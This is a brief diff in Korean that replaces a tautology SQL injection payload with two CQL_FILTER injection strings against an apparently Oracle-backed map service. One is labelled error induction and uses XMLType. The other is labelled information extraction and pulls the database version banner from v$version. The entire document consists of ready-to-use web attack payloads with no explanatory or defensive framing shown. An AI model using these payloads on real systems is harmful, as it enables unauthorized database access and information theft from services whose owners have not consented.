@@ -1,1 +1,4 @@
-CQL_FILTER=strEndsWith(속성명,'x'')) IS NULL OR 1=1--'
+​페이로드 (에러 유도):
+CQL_FILTER=strEndsWith(속성명,'x'')) IS NULL OR 1=(SELECT UPPER(XMLType('<root/>')) FROM dual)--'
+​페이로드 (정보 추출):
+CQL_FILTER=strEndsWith(속성명,'x'')) IS NULL OR 1=(SELECT banner FROM v$version WHERE rownum=1)--'
